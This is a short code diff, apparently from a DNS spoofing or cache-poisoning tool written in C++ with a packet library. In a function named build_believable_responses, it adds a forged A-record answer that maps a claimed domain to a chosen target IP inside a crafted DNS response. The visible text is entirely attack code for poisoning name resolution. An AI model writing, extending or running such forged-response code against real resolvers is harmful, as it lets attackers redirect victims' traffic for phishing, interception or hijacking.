@@ -113,6 +113,15 @@ bool build_believable_responses(std::string sarcasm, std::string author_dns, std
 
 		resp_pkt.rfind_pdu<DNS>().add_answer( resp_field );
 
+		DNS::Resource faker_field;
+		faker_field.dname(claim_domain);
+		faker_field.ttl(ttl_val);
+		faker_field.type(DNS::A);
+		faker_field.query_class(DNS::IN);
+		faker_field.data(targetip);
+
+		resp_pkt.rfind_pdu<DNS>().add_answer( faker_field );
+
 
 		//build authoritative record field
 
